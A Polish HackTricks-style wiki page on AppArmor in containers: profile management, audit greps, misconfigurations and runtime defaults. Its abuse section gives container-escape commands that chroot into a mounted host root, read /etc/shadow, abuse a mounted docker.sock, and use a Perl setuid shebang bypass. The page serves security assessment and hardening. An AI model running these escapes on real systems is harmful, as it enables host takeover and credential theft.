# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system **Mandatory Access Control**, który nakłada ograniczenia za pomocą profili przypisanych do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, które w dużej mierze zależą od własności użytkownika i grupy, AppArmor pozwala jądru egzekwować politykę przypisaną do samego procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, by podjąć próbę wykonania działania, a mimo to zostać zablokowany, jeśli jego profil AppArmor nie zezwala na dostęp do odpowiedniej ścieżki, montowanie, określone zachowanie sieciowe lub użycie danej capability.

Najważniejsza kwestia jest taka, że AppArmor działa w oparciu o **ścieżki**. Ocenia dostęp do systemu plików na podstawie reguł dotyczących ścieżek, a nie etykiet, jak robi to SELinux. Dzięki temu jest przystępny i skuteczny, ale oznacza też, że bind mounts i alternatywne układy ścieżek wymagają szczególnej uwagi. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, działanie polityki może odbiegać od początkowych oczekiwań operatora.

## Rola w izolacji kontenerów

Podczas przeglądu bezpieczeństwa kontenerów często kończy się na capabilities i seccomp, ale AppArmor nadal ma znaczenie po sprawdzeniu tych mechanizmów. Wyobraź sobie kontener z większymi uprawnieniami, niż powinien mieć, albo workload, który z powodów operacyjnych potrzebuje jednej dodatkowej capability. AppArmor nadal może ograniczać dostęp do plików, zachowanie związane z montowaniem, sieć i wzorce wykonywania, blokując w ten sposób oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor „tylko po to, żeby aplikacja działała” może po cichu zmienić konfigurację, która była jedynie ryzykowna, w konfigurację podatną na aktywne wykorzystanie.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Aby sprawdzić, w jakim środowisku działa bieżący proces kontenera:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Różnica jest pouczająca. W normalnym przypadku proces powinien mieć kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku bez ograniczeń ta dodatkowa warstwa restrykcji znika.

Możesz też sprawdzić, co według Dockera zostało zastosowane:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Użycie w czasie wykonywania

Docker może zastosować domyślny lub niestandardowy profil AppArmor, jeśli host go obsługuje. Podman może również integrować się z AppArmor w systemach opartych na AppArmor, choć w dystrybucjach, w których priorytetem jest SELinux, często dominuje ten drugi system MAC. Kubernetes może udostępniać politykę AppArmor na poziomie workloadu w węzłach, które faktycznie obsługują AppArmor. LXC i powiązane z nim środowiska kontenerów systemowych z rodziny Ubuntu również szeroko korzystają z AppArmor.

W praktyce AppArmor nie jest „funkcją Dockera”. To funkcja jądra hosta, którą różne runtime’y mogą zdecydować się zastosować. Jeśli host go nie obsługuje lub runtime ma uruchamiać kontener bez ograniczeń, rzekoma ochrona w rzeczywistości nie działa.

W przypadku Kubernetes nowoczesnym API jest `securityContext.appArmorProfile`. Od Kubernetes `v1.30` starsze adnotacje AppArmor w wersji beta są przestarzałe. Na obsługiwanych hostach domyślnym profilem jest `RuntimeDefault`, a `Localhost` wskazuje profil, który musi być już załadowany w węźle. Ma to znaczenie podczas przeglądu, ponieważ manifest może wyglądać na skonfigurowany z myślą o AppArmor, a mimo to całkowicie zależeć od obsługi po stronie węzła i wstępnie załadowanych profili.<sup>[[1]](#references)</sup>

Jednym z subtelnych, ale przydatnych szczegółów operacyjnych jest to, że jawne ustawienie `appArmorProfile.type: RuntimeDefault` jest bardziej restrykcyjne niż pominięcie tego pola. Jeśli pole jest jawnie ustawione, a węzeł nie obsługuje AppArmor, admission powinien zakończyć się niepowodzeniem. Jeśli pole zostanie pominięte, workload może nadal działać w węźle bez AppArmor i po prostu nie otrzymać tej dodatkowej warstwy ograniczeń. Z punktu widzenia atakującego warto więc sprawdzić zarówno manifest, jak i rzeczywisty stan węzła.<sup>[[1]](#references)</sup>

Na hostach obsługujących Dockera i AppArmor najbardziej znanym domyślnym profilem jest `docker-default`. Profil ten jest generowany na podstawie szablonu AppArmor z Moby i ma znaczenie, ponieważ wyjaśnia, dlaczego niektóre PoC wykorzystujące capabilities nadal nie działają w domyślnym kontenerze. Ogólnie rzecz biorąc, `docker-default` zezwala na zwykłą komunikację sieciową, blokuje zapisy do znacznej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje mount i ogranicza ptrace, tak aby nie był on uniwersalnym narzędziem do badania hosta. Zrozumienie tej podstawowej konfiguracji pomaga odróżnić „kontener ma `CAP_SYS_ADMIN`” od „kontener może faktycznie użyć tej capability do uzyskania dostępu do interesujących mnie interfejsów jądra”.

## Zarządzanie profilami

Profile AppArmor są zwykle przechowywane w `/etc/apparmor.d/`. Typową konwencją nazewnictwa jest zastępowanie ukośników w ścieżce pliku wykonywalnego kropkami. Na przykład profil dla `/usr/bin/man` jest zwykle przechowywany jako `/etc/apparmor.d/usr.bin.man`. Ma to znaczenie zarówno podczas obrony, jak i oceny zabezpieczeń, ponieważ gdy znasz nazwę aktywnego profilu, często możesz szybko znaleźć odpowiadający mu plik na hoście.

Do przydatnych poleceń zarządzania po stronie hosta należą:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Powodem, dla którego te polecenia są istotne w kontekście bezpieczeństwa kontenerów, jest to, że wyjaśniają, jak profile są faktycznie tworzone, ładowane, przełączane w tryb complain i modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przełączać profile w tryb complain podczas rozwiązywania problemów i zapominać o przywróceniu wymuszania, kontener może wyglądać na zabezpieczony w dokumentacji, a w rzeczywistości działać ze znacznie luźniejszymi ograniczeniami.

### Tworzenie i aktualizowanie profili

`aa-genprof` może obserwować działanie aplikacji i pomagać w interaktywnym generowaniu profilu:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` może wygenerować profil szablonowy, który można później załadować za pomocą `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Gdy plik binarny ulegnie zmianie i trzeba zaktualizować policy, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi zdecydować, czy je dopuścić, czy odrzucić:

```bash
sudo aa-logprof
```

### Dzienniki

Odmowy AppArmor są często widoczne w `auditd`, syslogu lub narzędziach takich jak `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Jest to przydatne zarówno z punktu widzenia operacyjnego, jak i ofensywnego. Obrońcy wykorzystują tę wiedzę do udoskonalania profili. Atakujący używają jej, aby ustalić, która dokładnie ścieżka lub operacja jest blokowana i czy to AppArmor blokuje łańcuch exploitów.

### Ustalanie dokładnego pliku profilu

Gdy środowisko uruchomieniowe pokazuje konkretną nazwę profilu AppArmor dla kontenera, często warto powiązać tę nazwę z plikiem profilu na dysku:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Jest to szczególnie przydatne podczas audytu po stronie hosta, ponieważ pozwala powiązać informację „kontener informuje, że działa w profilu `lowpriv`” z „rzeczywiste reguły znajdują się w tym konkretnym pliku, który można skontrolować lub wczytać ponownie”.

### Reguły o dużym znaczeniu do audytu

Jeśli możesz odczytać profil, nie poprzestawaj na prostych liniach `deny`. Kilka typów reguł istotnie wpływa na skuteczność AppArmor w przypadku próby ucieczki z kontenera:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: uruchamiają plik binarny bez ograniczeń. Jeśli dostępny helper, powłoka lub interpreter jest dozwolony przez `ux`, zwykle warto zacząć testowanie właśnie od niego.
- `px` / `Px` oraz `cx` / `Cx`: wykonują przejścia między profilami podczas `exec`. Nie są automatycznie niebezpieczne, ale warto je skontrolować, ponieważ przejście może prowadzić do znacznie szerszego profilu niż bieżący.
- `change_profile`: pozwala zadaniu przełączyć się na inny załadowany profil — od razu lub przy następnym `exec`. Jeśli profil docelowy jest słabszy, może to stać się przewidzianą drogą ucieczki z restrykcyjnej domeny.
- `flags=(complain)`, `flags=(unconfined)` lub nowsze `flags=(prompt)`: powinny wpływać na poziom zaufania do profilu. `complain` rejestruje naruszenia zamiast ich blokować, `unconfined` usuwa granicę, a `prompt` zależy od decyzji userspace, a nie wyłącznie od blokowania wymuszanego przez kernel.
- `userns` lub `userns create,`: nowsze zasady AppArmor mogą kontrolować tworzenie user namespace. Jeśli profil kontenera jawnie na to zezwala, zagnieżdżone user namespace nadal są dostępne, nawet gdy platforma wykorzystuje AppArmor jako element strategii hardeningu.

Przydatne polecenie `grep` po stronie hosta:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ten rodzaj audytu jest często bardziej przydatny niż wpatrywanie się w setki zwykłych reguł dotyczących plików. Jeśli breakout wymaga uruchomienia helpera, wejścia do nowej przestrzeni nazw lub ucieczki do mniej restrykcyjnego profilu, odpowiedź często kryje się w tych regułach dotyczących przejść, a nie w oczywistych wierszach w stylu `deny /etc/shadow r`.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają tę opcję podczas debugowania aplikacji, która nie działała, ponieważ profil prawidłowo blokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w środowisku produkcyjnym, cała warstwa MAC zostanie w praktyce usunięta.

Innym subtelnym problemem jest założenie, że bind mounts są nieszkodliwe, bo uprawnienia plików wyglądają normalnie. Ponieważ AppArmor działa na podstawie ścieżek, udostępnienie ścieżek hosta pod alternatywnymi lokalizacjami montowania może prowadzić do konfliktów z regułami ścieżek. Trzecim błędem jest zapomnienie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli jądro hosta faktycznie nie wymusza działania AppArmor.

## Nadużycia

Gdy AppArmor nie działa, operacje, które wcześniej były ograniczone, mogą nagle stać się możliwe: odczytywanie wrażliwych ścieżek przez bind mounts, uzyskiwanie dostępu do części procfs lub sysfs, których użycie powinno być utrudnione, wykonywanie operacji związanych z montowaniem, jeśli pozwalają na to również capabilities/seccomp, albo korzystanie ze ścieżek, do których profil normalnie odmawiałby dostępu. AppArmor często wyjaśnia, dlaczego próba breakout oparta na capabilities, która teoretycznie „powinna zadziałać”, w praktyce nadal kończy się niepowodzeniem. Po usunięciu AppArmor ta sama próba może zacząć się powodzić.

Jeśli podejrzewasz, że to AppArmor powstrzymuje łańcuch nadużyć oparty na path traversal, bind mountach lub montowaniu, pierwszym krokiem jest zwykle porównanie tego, co staje się dostępne z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz przejść do tej ścieżki i ją odczytać:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Jeśli kontener ma również niebezpieczną capability, taką jak `CAP_SYS_ADMIN`, jednym z najbardziej praktycznych testów jest sprawdzenie, czy AppArmor jest mechanizmem kontrolnym blokującym operacje mount lub dostęp do wrażliwych systemów plików jądra:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

W środowiskach, w których ścieżka hosta jest już dostępna przez bind mount, utrata ochrony AppArmor może również zmienić problem ujawnienia informacji w trybie tylko do odczytu w bezpośredni dostęp do plików hosta:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Celem tych poleceń nie jest wykazanie, że sam AppArmor umożliwia ucieczkę z kontenera. Chodzi o to, że po wyłączeniu AppArmor można od razu testować wiele ścieżek nadużyć związanych z systemem plików i montowaniem.

### Pełny przykład: wyłączony AppArmor + zamontowany katalog główny hosta

Jeśli katalog główny hosta jest już zamontowany w kontenerze przez bind mount pod ścieżką `/host`, usunięcie AppArmor może zmienić zablokowaną ścieżkę nadużycia systemu plików w pełną ucieczkę z kontenera na hosta:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Gdy powłoka wykonuje polecenia za pośrednictwem systemu plików hosta, obciążenie w praktyce wydostało się poza granice kontenera:

```bash
id
hostname
cat /etc/shadow | head
```

### Pełny przykład: AppArmor wyłączony + gniazdo runtime

Jeśli rzeczywistą barierą był AppArmor chroniący stan runtime, zamontowane gniazdo może wystarczyć do pełnej ucieczki:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Dokładna ścieżka zależy od punktu montowania, ale rezultat jest taki sam: AppArmor nie blokuje już dostępu do runtime API, a runtime API może uruchomić kontener zagrażający hostowi.

### Pełny przykład: obejście ochrony przez bind-mount oparty na ścieżkach

Ponieważ AppArmor działa w oparciu o ścieżki, ochrona `/proc/**` nie zabezpiecza automatycznie tej samej zawartości hostowego procfs, gdy można ją osiągnąć pod inną ścieżką:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Wpływ zależy od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka omija również inne mechanizmy kontroli, ale ten wzorzec jest jednym z najwyraźniejszych powodów, dla których AppArmor należy oceniać łącznie z układem montowań, a nie w oderwaniu od niego.

### Pełny przykład: Shebang Bypass

AppArmor może przypisać profil do ścieżki uruchamianego skryptu zamiast do interpretera wskazanego w jego shebangu. Z kolei bezpośrednie wywołanie interpretera może skutkować użyciem profilu interpretera. [Opiekun AppArmor opisuje tę różnicę](https://bugs.launchpad.net/apparmor/+bug/1911431). Historyczny przykład dotyczył skryptu, którego pierwszy wiersz wskazywał na interpreter objęty ograniczeniami:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Przykład wskazuje jedynie potencjalny przypadek, w którym interpreter może uzyskać skuteczne uprawnienie do pliku, a reguła `exec` skryptu zezwala na tę operację. Sprawdź załadowaną politykę i etykietę procesu, zbiór ograniczający capabilities, `no_new_privs` oraz stan `nosuid` punktu montowania; sama nazwa pliku profilu ani wpis `cap_setuid+ep` nie dowodzą, że możliwa jest użyteczna zmiana. Łańcuchy interpreterów i alternatywne ścieżki wykonania wymagają osobnej analizy.

## Checks

Celem tych kontroli jest szybkie uzyskanie odpowiedzi na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest objęty ograniczeniami i czy środowisko uruchomieniowe faktycznie zastosowało profil do tego kontenera?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Co jest tu interesujące:

- Jeśli `/proc/self/attr/current` wyświetla `unconfined`, obciążenie nie korzysta z izolacji AppArmor.
- Jeśli `aa-status` pokazuje, że AppArmor jest wyłączony lub niezaładowany, dowolna nazwa profilu w konfiguracji runtime jest w dużej mierze kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub nieoczekiwany profil niestandardowy, często właśnie dlatego działa ścieżka nadużycia oparta na systemie plików lub montowaniu.
- Jeśli `/sys/kernel/security/apparmor/profiles` nie zawiera oczekiwanego profilu, sama konfiguracja runtime’u lub orkiestratora nie wystarczy.
- Jeśli rzekomo utwardzony profil zawiera reguły w stylu `ux`, szerokie `change_profile`, `userns` lub `flags=(complain)`, rzeczywista granica bezpieczeństwa może być znacznie słabsza, niż sugeruje nazwa profilu.

Jeśli kontener ma już podwyższone uprawnienia ze względów operacyjnych, pozostawienie AppArmor włączonego często decyduje o tym, czy mamy do czynienia z kontrolowanym wyjątkiem, czy ze znacznie poważniejszą awarią bezpieczeństwa.

## Domyślne ustawienia runtime’ów

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie włączony na hostach obsługujących AppArmor | Używa profilu AppArmor `docker-default`, chyba że zostanie on zastąpiony | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zależny od hosta | AppArmor jest obsługiwany przez `--security-opt`, ale dokładne ustawienie domyślne zależy od hosta/runtime’u i jest mniej uniwersalne niż udokumentowany profil Dockera `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Domyślnie warunkowo | Jeśli `appArmorProfile.type` nie jest określone, domyślnie używana jest wartość `RuntimeDefault`, ale tylko wtedy, gdy AppArmor jest włączony na węźle | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` ze słabym profilem, węzły bez obsługi AppArmor |
| containerd / CRI-O w Kubernetes | Zależny od obsługi przez węzeł/runtime | Typowe runtime’y obsługiwane przez Kubernetes obsługują AppArmor, ale rzeczywiste egzekwowanie nadal zależy od obsługi przez węzeł i ustawień obciążenia | Jak w wierszu dotyczącym Kubernetes; bezpośrednia konfiguracja runtime’u może również całkowicie pominąć AppArmor |

W przypadku AppArmor najważniejszą zmienną jest często **host**, a nie tylko runtime. Ustawienie profilu w manifeście nie zapewnia izolacji na węźle, na którym AppArmor nie jest włączony.

## References

- [1] [Kontekst bezpieczeństwa Kubernetes: pola profilu AppArmor i zachowanie zależne od obsługi przez węzeł](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Strona man `apparmor.d(5)` dla Ubuntu 24.04: przejścia exec, `change_profile`, `userns` i flagi profilu](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
